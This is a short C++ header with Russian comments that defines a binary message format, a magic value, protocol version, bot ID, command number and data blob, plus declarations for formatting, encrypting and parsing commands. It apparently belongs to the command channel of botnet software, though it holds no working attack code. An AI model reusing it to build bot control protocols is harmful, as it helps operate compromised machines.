#pragma once
#include "stdafx.h"

#define proto_magic "VXLB"
#define proto_magic_bin 0x424c5856
#define proto_ver 1

/*
-магическая константа (DWORD)
-версия протокола (DWORD)
-ид бота (DWORD)
-номер команды (DWORD)
-blob с данными (DWORD)(BYTE[n])
-padding (BYTE[n])
*/

void FormatCommand(DWORD bid, DWORD cmd, cmem & blob, cmem & p);
void EncryptCommand(cmem & p);

struct proto
{
	DWORD magic;
	DWORD version;
	DWORD bid;
	DWORD cid;
	DWORD blob_size;
	BYTE blob;
};

struct proto2
{
	DWORD version;
	DWORD bid;
	DWORD cid;
	cmem blob;
};

BOOL ParseProto(cmem & p, proto2 & st);
